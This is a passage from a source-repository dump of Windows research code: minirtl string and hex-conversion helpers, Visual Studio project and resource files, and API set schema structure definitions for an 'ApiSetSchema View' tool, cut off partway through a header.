size_t _strlen_w(const wchar_t *s)
{
	wchar_t *s0 = (wchar_t *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/minirtl/minirtl.h`:

```h
/*
Module name:
	minirtl.h

Description:
	header for string handling and conversion routines

Date:
	1 Mar 2015
*/

#ifndef _MINIRTL_
#define _MINIRTL_

// string copy/concat/length

char *_strend_a(const char *s);
wchar_t *_strend_w(const wchar_t *s);

char *_strcpy_a(char *dest, const char *src);
wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src);

char *_strcat_a(char *dest, const char *src);
wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src);

char *_strncpy_a(char *dest, size_t ccdest, const char *src, size_t ccsrc);
wchar_t *_strncpy_w(wchar_t *dest, size_t ccdest, const wchar_t *src, size_t ccsrc);

char *_strcpyn_a(char* dest, const char* src, size_t n);
wchar_t *_strcpyn_w(wchar_t* dest, const wchar_t* src, size_t n);

size_t _strlen_a(const char *s);
size_t _strlen_w(const wchar_t *s);

// comparing

int _strcmp_a(const char *s1, const char *s2);
int _strcmp_w(const wchar_t *s1, const wchar_t *s2);

int _strncmp_a(const char *s1, const char *s2, size_t cchars);
int _strncmp_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

int _strcmpi_a(const char *s1, const char *s2);
int _strcmpi_w(const wchar_t *s1, const wchar_t *s2);

int _strncmpi_a(const char *s1, const char *s2, size_t cchars);
int _strncmpi_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

char *_strstr_a(const char *s, const char *sub_s);
wchar_t *_strstr_w(const wchar_t *s, const wchar_t *sub_s);

char *_strstri_a(const char *s, const char *sub_s);
wchar_t *_strstri_w(const wchar_t *s, const wchar_t *sub_s);

// conversion of integer types to string, returning string length

size_t ultostr_a(unsigned long x, char *s);
size_t ultostr_w(unsigned long x, wchar_t *s);

size_t ultohex_a(unsigned long x, char *s);
size_t ultohex_w(unsigned long x, wchar_t *s);

size_t itostr_a(int x, char *s);
size_t itostr_w(int x, wchar_t *s);

size_t i64tostr_a(signed long long x, char *s);
size_t i64tostr_w(signed long long x, wchar_t *s);

size_t u64tostr_a(unsigned long long x, char *s);
size_t u64tostr_w(unsigned long long x, wchar_t *s);

size_t u64tohex_a(unsigned long long x, char *s);
size_t u64tohex_w(unsigned long long x, wchar_t *s);

// string to integers conversion

unsigned long strtoul_a(char *s);
unsigned long strtoul_w(wchar_t *s);

unsigned long long strtou64_a(char *s);
unsigned long long strtou64_w(wchar_t *s);

unsigned long hextoul_a(char *s);
unsigned long hextoul_w(wchar_t *s);

int strtoi_a(char *s);
int strtoi_w(wchar_t *s);

signed long long strtoi64_a(char *s);
signed long long strtoi64_w(wchar_t *s);

unsigned long long hextou64_a(char *s);
unsigned long long hextou64_w(wchar_t *s);

/* =================================== */

#ifdef UNICODE

#define _strend _strend_w
#define _strcpy _strcpy_w
#define _strcat _strcat_w
#define _strlen _strlen_w
#define _strncpy _strncpy_w
#define _strcpyn _strcpyn_w

#define _strcmp _strcmp_w
#define _strncmp _strncmp_w
#define _strcmpi _strcmpi_w
#define _strncmpi _strncmpi_w
#define _strstr _strstr_w
#define _strstri _strstri_w

#define ultostr ultostr_w
#define ultohex ultohex_w
#define itostr itostr_w
#define i64tostr i64tostr_w
#define u64tostr u64tostr_w
#define u64tohex u64tohex_w

#define strtoul strtoul_w
#define hextoul hextoul_w
#define strtoi strtoi_w
#define strtoi64 strtoi64_w
#define strtou64 strtou64_w
#define hextou64 hextou64_w

#else // ANSI

#define _strend _strend_a
#define _strcpy _strcpy_a
#define _strcat _strcat_a
#define _strlen _strlen_a
#define _strncpy _strncpy_a
#define _strcpyn _strcpyn_a

#define _strcmp _strcmp_a
#define _strncmp _strncmp_a
#define _strcmpi _strcmpi_a
#define _strncmpi _strncmpi_a
#define _strstr _strstr_a
#define _strstri _strstri_a

#define ultostr ultostr_a
#define ultohex ultohex_a
#define itostr itostr_a
#define i64tostr i64tostr_a
#define u64tostr u64tostr_a
#define u64tohex u64tohex_a

#define strtoul strtoul_a
#define hextoul hextoul_a
#define strtoi strtoi_a
#define strtoi64 strtoi64_a
#define strtou64 strtou64_a
#define hextou64 hextou64_a

#endif

#endif /* _MINIRTL_ */

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/minirtl/rtltypes.h`:

```h
#ifndef _WCHAR_T_DEFINED
typedef unsigned short wchar_t;
#define _WCHAR_T_DEFINED
#endif  /* _WCHAR_T_DEFINED */

#ifndef _SIZE_T_DEFINED
#ifdef _WIN64
typedef unsigned __int64    size_t;
#else  /* _WIN64 */
typedef __w64 unsigned int   size_t;
#endif  /* _WIN64 */
#define _SIZE_T_DEFINED
#endif  /* _SIZE_T_DEFINED */

__forceinline char locase_a(char c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline wchar_t locase_w(wchar_t c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline char byteabs(char x) {
	if (x < 0)
		return -x;
	return x;
}

__forceinline int _isdigit_a(char x) {
	return ((x >= '0') && (x <= '9'));
}

__forceinline int _isdigit_w(wchar_t x) {
	return ((x >= L'0') && (x <= L'9'));
}

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/minirtl/u64tohex.c`:

```c
#include "rtltypes.h"

size_t u64tohex_a(unsigned long long x, char *s)
{
	char	p;
	size_t	c;

	if (s==0)
		return 16;

	for (c=0; c<16; c++) {
		p = (char)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += '0';
		else
			p = 'A' + (p-10);

		s[15-c] = p;
	}

	s[16] = 0;
	return 16;
}

size_t u64tohex_w(unsigned long long x, wchar_t *s)
{
	wchar_t	p;
	size_t	c;

	if (s==0)
		return 16;

	for (c = 0; c<16; c++) {
		p = (wchar_t)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += L'0';
		else
			p = L'A' + (p-10);

		s[15-c] = p;
	}

	s[16] = 0;
	return 16;
}

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/minirtl/ultohex.c`:

```c
#include "rtltypes.h"

size_t ultohex_a(unsigned long x, char *s)
{
	char	p;
	size_t	c;

	if (s==0)
		return 8;

	for (c=0; c<8; c++) {
		p = (char)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += '0';
		else
			p = 'A' + (p-10);

		s[7-c] = p;
	}

	s[8] = 0;
	return 8;
}

size_t ultohex_w(unsigned long x, wchar_t *s)
{
	wchar_t	p;
	size_t	c;

	if (s==0)
		return 8;

	for (c=0; c<8; c++) {
		p = (wchar_t)(x & 0xf);
		x >>= 4;

		if (p<10)
			p += L'0';
		else
			p = L'A' + (p-10);

		s[7-c] = p;
	}

	s[8] = 0;
	return 8;
}

```

`source/ApiSetSchema/1.manifest`:

```manifest
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1" xmlns:asmv3="urn:schemas-microsoft-com:asm.v3">
    <assemblyIdentity 
        type="win32" 
        name="ApiSetSchemaView"
        version="1.0.0.0"
        processorArchitecture="*"
    />
    <description> ApiSetSchemaView </description>
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
        <security>
            <requestedPrivileges>
                <requestedExecutionLevel
                    level="asInvoker"
                    uiAccess="false"
                />	
            </requestedPrivileges>
        </security>
    </trustInfo>
    <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"> 
        <application> 
            <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
            <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
            <supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"/> 
            <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/>
            <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/>
        </application> 
    </compatibility>

  <dependency>
    <dependentAssembly>
      <assemblyIdentity                 
        type="win32"
        name="Microsoft.Windows.Common-Controls"
        version="6.0.0.0"
        publicKeyToken="6595b64144ccf1df"
        language="*"
        processorArchitecture="*"
        />
    </dependentAssembly>
  </dependency>

</assembly>
```

`source/ApiSetSchema/ApiSetSchemaView.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28010.2048
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ApiSetSchemaView", "ApiSetSchemaView.vcxproj", "{91352FD7-5569-4D5D-8677-735C8925A3B8}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{91352FD7-5569-4D5D-8677-735C8925A3B8}.Debug|x64.ActiveCfg = Debug|x64
		{91352FD7-5569-4D5D-8677-735C8925A3B8}.Debug|x64.Build.0 = Debug|x64
		{91352FD7-5569-4D5D-8677-735C8925A3B8}.Release|x64.ActiveCfg = Release|x64
		{91352FD7-5569-4D5D-8677-735C8925A3B8}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {82481A72-5B56-4EC1-98A9-64BB64B2BCDA}
	EndGlobalSection
EndGlobal

```

`source/ApiSetSchema/ApiSetSchemaView.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{91352FD7-5569-4D5D-8677-735C8925A3B8}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>ApiSetSchemaView</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17134.0</WindowsTargetPlatformVersion>
    <ProjectName>ApiSetSchemaView</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <CodeAnalysisRuleSet>AllRules.ruleset</CodeAnalysisRuleSet>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EntryPointSymbol>main</EntryPointSymbol>
    </Link>
    <Manifest>
      <AdditionalManifestFiles>1.manifest</AdditionalManifestFiles>
    </Manifest>
    <Manifest>
      <EnableDpiAwareness>true</EnableDpiAwareness>
    </Manifest>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <CompileAs>CompileAsC</CompileAs>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EntryPointSymbol>main</EntryPointSymbol>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
    <Manifest>
      <AdditionalManifestFiles>1.manifest</AdditionalManifestFiles>
    </Manifest>
    <Manifest>
      <EnableDpiAwareness>true</EnableDpiAwareness>
    </Manifest>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.c" />
    <ClCompile Include="minirtl\ultostr.c" />
    <ClCompile Include="minirtl\_strcat.c" />
    <ClCompile Include="minirtl\_strcmpi.c" />
    <ClCompile Include="minirtl\_strcpy.c" />
    <ClCompile Include="minirtl\_strend.c" />
    <ClCompile Include="minirtl\_strlen.c" />
    <ClCompile Include="minirtl\_strncmpi.c" />
    <ClCompile Include="minirtl\_strncpy.c" />
    <ClCompile Include="minirtl\_strstr.c" />
    <ClCompile Include="treelist.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="apisetx.h" />
    <ClInclude Include="minirtl\minirtl.h" />
    <ClInclude Include="minirtl\rtltypes.h" />
    <ClInclude Include="ntos.h" />
    <ClInclude Include="resource.h" />
    <ClInclude Include="treelist.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="Resource.rc" />
  </ItemGroup>
  <ItemGroup>
    <Image Include="icon_gears.ico" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`source/ApiSetSchema/ApiSetSchemaView.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="minirtl">
      <UniqueIdentifier>{fedfdada-d38f-4744-9693-0daa0f83e0a6}</UniqueIdentifier>
    </Filter>
    <Filter Include="treelist">
      <UniqueIdentifier>{b0a555b1-c59f-4263-b8c8-e6d4755781d1}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcat.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcpy.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strend.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strlen.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strncpy.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strstr.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="treelist.c">
      <Filter>treelist</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\ultostr.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcmpi.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strncmpi.c">
      <Filter>minirtl</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ntos.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\minirtl.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\rtltypes.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="treelist.h">
      <Filter>treelist</Filter>
    </ClInclude>
    <ClInclude Include="apisetx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="Resource.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <Image Include="icon_gears.ico">
      <Filter>Resource Files</Filter>
    </Image>
  </ItemGroup>
</Project>
```

`source/ApiSetSchema/ApiSetSchemaView.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <ShowAllFiles>false</ShowAllFiles>
  </PropertyGroup>
</Project>
```

`source/ApiSetSchema/Resource.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Dialog
//

IDD_ASDIALOG DIALOGEX 0, 0, 495, 336
STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU
CAPTION "ApiSetSchema View"
FONT 8, "MS Shell Dlg", 400, 0, 0x1
BEGIN
    GROUPBOX        "Search by name",IDC_STATIC,213,288,275,41
    EDITTEXT        IDC_SEARCH_EDIT,219,303,192,14,ES_LOWERCASE | ES_AUTOHSCROLL
    DEFPUSHBUTTON   "Search",IDC_SEARCH_BUTTON,416,303,50,14
    GROUPBOX        "Entry",IDC_STATIC,7,288,202,41
    EDITTEXT        IDC_ENTRY_EDIT,12,303,192,14,ES_AUTOHSCROLL | ES_READONLY
END


/////////////////////////////////////////////////////////////////////////////
//
// DESIGNINFO
//

#ifdef APSTUDIO_INVOKED
GUIDELINES DESIGNINFO
BEGIN
    IDD_ASDIALOG, DIALOG
    BEGIN
        LEFTMARGIN, 7
        RIGHTMARGIN, 488
        TOPMARGIN, 7
        BOTTOMMARGIN, 329
    END
END
#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// AFX_DIALOG_LAYOUT
//

IDD_ASDIALOG AFX_DIALOG_LAYOUT
BEGIN
    0
END


/////////////////////////////////////////////////////////////////////////////
//
// Icon
//

// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_ICON_MAIN           ICON                    "icon_gears.ico"


/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,0,0,1905
 PRODUCTVERSION 1,0,0,1905
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x1L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "UG North"
            VALUE "FileVersion", "1.0.0.1905"
            VALUE "InternalName", "ApiSetSchemaView.exe"
            VALUE "LegalCopyright", "Copyright (C) 2018"
            VALUE "OriginalFilename", "ApiSetSchemaView.exe"
            VALUE "ProductName", "ApiSet Schema Viewer"
            VALUE "ProductVersion", "1.0.0.1905"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`source/ApiSetSchema/apisetx.h`:

```h
/************************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2018, translated from Microsoft sources/debugger
*
*  TITLE:       APISETX.H
*
*  VERSION:     1.03
*
*  DATE:        24 Oct 2018
*
*  Common header file for the ApiSetSchema definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
************************************************************************************/

#pragma once

#ifndef APISETX
#define APISETX

//
// Copy-pasted from MS headers.
//

#define API_SET_SECTION_NAME            ".apiset"
#define API_SET_SCHEMA_SUFFIX           L".sys"

#define API_SET_PREFIX_NAME_A           "API-"
#define API_SET_PREFIX_NAME_A_SIZE      (sizeof(API_SET_PREFIX_NAME_A) - sizeof(CHAR))
#define API_SET_PREFIX_NAME_U           TEXT(API_SET_PREFIX_NAME_A)
#define API_SET_PREFIX_NAME_U_SIZE      (sizeof(API_SET_PREFIX_NAME_U) - sizeof(WCHAR))
#define API_SET_PREFIX_NAME_LENGTH      (RTL_NUMBER_OF(API_SET_PREFIX_NAME_U) - 1)

#define API_SET_EXTENSION_NAME_A        "EXT-"
#define API_SET_EXTENSION_NAME_A_SIZE   (sizeof(API_SET_EXTENSION_NAME_A) - sizeof(CHAR))
#define API_SET_EXTENSION_NAME_U        TEXT(API_SET_EXTENSION_NAME_A)
#define API_SET_EXTENSION_NAME_U_SIZE   (sizeof(API_SET_EXTENSION_NAME_U) - sizeof(WCHAR))
#define API_SET_EXTENSION_NAME_LENGTH   (RTL_NUMBER_OF(API_SET_EXTENSION_NAME_U) - 1)

#define API_SET_SCHEMA_FLAGS_SEALED              0x00000001UL
#define API_SET_SCHEMA_FLAGS_HOST_EXTENSION      0x00000002UL

#define API_SET_SCHEMA_ENTRY_FLAGS_SEALED        0x00000001UL
#define API_SET_SCHEMA_ENTRY_FLAGS_EXTENSION     0x00000002UL

#define API_SET_SCHEMA_VERSION_V2    2
#define API_SET_SCHEMA_VERSION_V3    3  //private
#define API_SET_SCHEMA_VERSION_V4    4
#define API_SET_SCHEMA_VERSION_V6    6

#define EMPTY_NAMESPACE_VALUE(ValueOffset, ValueLength, NameOffset, NameLength)\
    ((ValueOffset == 0) && (ValueLength == 0) && (NameOffset == 0) && (NameLength == 0))

// V2

typedef struct _API_SET_VALUE_ENTRY_V2 {
    ULONG NameOffset;
    ULONG NameLength;
    ULONG ValueOffset;
    ULONG ValueLength;
} API_SET_VALUE_ENTRY_V2, *PAPI_SET_VALUE_ENTRY_V2;

typedef struct _API_SET_VALUE_ARRAY_V2 {
    ULONG Count;
    API_SET_VALUE_ENTRY_V2 Array[ANYSIZE_ARRAY];
} API_SET_VALUE_ARRAY_V2, *PAPI_SET_VALUE_ARRAY_V2;

typedef struct _API_SET_NAMESPACE_ENTRY_V2 {
    ULONG NameOffset;
    ULONG NameLength;
    ULONG DataOffset;   // API_SET_VALUE_ARRAY
} API_SET_NAMESPACE_ENTRY_V2, *PAPI_SET_NAMESPACE_ENTRY_V2;

typedef struct _API_SET_NAMESPACE_ARRAY_V2 {
    ULONG Version;
    ULONG Count;
    _Field_size_full_(Count) API_SET_NAMESPACE_ENTRY_V2 Array[ANYSIZE_ARRAY];
} API_SET_NAMESPACE_ARRAY_V2, *PAPI_SET_NAMESPACE_ARRAY_V2;

// V4

typedef struct _API_SET_VALUE_ENTRY_V4 {
    ULONG Flags;
    ULONG NameOffset;
    _Field_range_(0, UNICODE_STRING_MAX_BYTES) ULONG NameLength;
    ULONG ValueOffset;
    _Field_range_(0, UNICODE_STRING_MAX_BYTES) ULONG ValueLength;
} API_SET_VALUE_ENTRY_V4, *PAPI_SET_VALUE_ENTRY_V4;

_Struct_size_bytes_(FIELD_OFFSET(API_SET_VALUE_ARRAY_V4, Array) + (sizeof(API_SET_VALUE_ENTRY_V4) * Count))
typedef struct _API_SET_VALUE_ARRAY_V4 {
    ULONG Flags;
    ULONG Count;
    _Field_size_full_(Count) API_SET_VALUE_ENTRY_V4 Array[ANYSIZE_ARRAY];
} API_SET_VALUE_ARRAY_V4, *PAPI_SET_VALUE_ARRAY_V4;

typedef struct _API_SET_NAMESPACE_ENTRY_V4 {
    ULONG Flags;
    ULONG NameOffset;
    _Field_range_(0, UNICODE_STRING_MAX_BYTES) ULONG NameLength;
    ULONG AliasOffset;
    _Field_range_(0, UNICODE_STRING_MAX_BYTES) ULONG AliasLength;
    ULONG DataOffset;   // API_SET_VALUE_ARRAY_V4
} API_SET_NAMESPACE_ENTRY_V4, *PAPI_SET_NAMESPACE_ENTRY_V4;

_Struct_size_bytes_(Size)
typedef struct _API_SET_NAMESPACE_ARRAY_V4 {
    ULONG Version;
    ULONG Size;
    ULONG Flags;
    ULONG Count;
    _Field_size_full_(Count) API_SET_NAMESPACE_ENTRY_V4 Array[ANYSIZE_ARRAY];
} API_SET_NAMESPACE_ARRAY_V4, *PAPI_SET_NAMESPACE_ARRAY_V4;

// V6

typedef struct _API_SET_HASH_ENTRY_V6 {
    ULONG Hash;
    ULONG NamespaceIndex;
} API_SET_HASH_ENTRY_V6, *PAPI_SET_HASH_ENTRY_V6;

typedef struct _API_SET_NAMESPACE_ENTRY_V6 {
    ULONG Flags;
    ULONG NameOffset;
    ULONG NameLength;
    ULONG HashNameLength; //size of name up to the last hyphen
    ULONG DataOffset;     //API_SET_VALUE_ENTRY_V6
    ULONG Count;          //number of API_SET_VALUE_ENTRY_V6 at DataOffset
} API_SET_NAMESPACE_ENTRY_V6, *PAPI_SET_NAMESPACE_ENTRY_V6;

typedef struct _API_SET_VALUE_ENTRY_V6 {
    ULONG Flags;
    ULONG NameOffset;
    ULONG NameLength;
    ULONG ValueOffset;
    ULONG ValueLength;
} API_SET_VALUE_ENTRY_V6, *PAPI_SET_VALUE_ENTRY_V6;

_Struct_size_bytes_(Size)
typedef struct _API_SET_NAMESPACE_ARRAY_V6 {
    ULONG Version;
    ULONG Size;
    ULONG Flags;
    ULONG Count;
    ULONG NamespaceEntryOffset;  //API_SET_NAMESPACE_ENTRY_V6
    ULONG NamespaceHashesOffset; //API_SET_NAMESPACE_HASH_ENTRY_V6
    ULONG HashMultiplier;
} API_SET_NAMESPACE_ARRAY_V6, *PAPI_SET_NAMESPACE_ARRAY_V6;

typedef struct _API_SET_NAMESPACE {
    union {
        API_SET_NAMESPACE_ARRAY_V2 *v2;
        API_SET_NAMESPACE_ARRAY_V4 *v4;
        API_SET_NAMESPACE_ARRAY_V6 *v6;
    } Namespace;
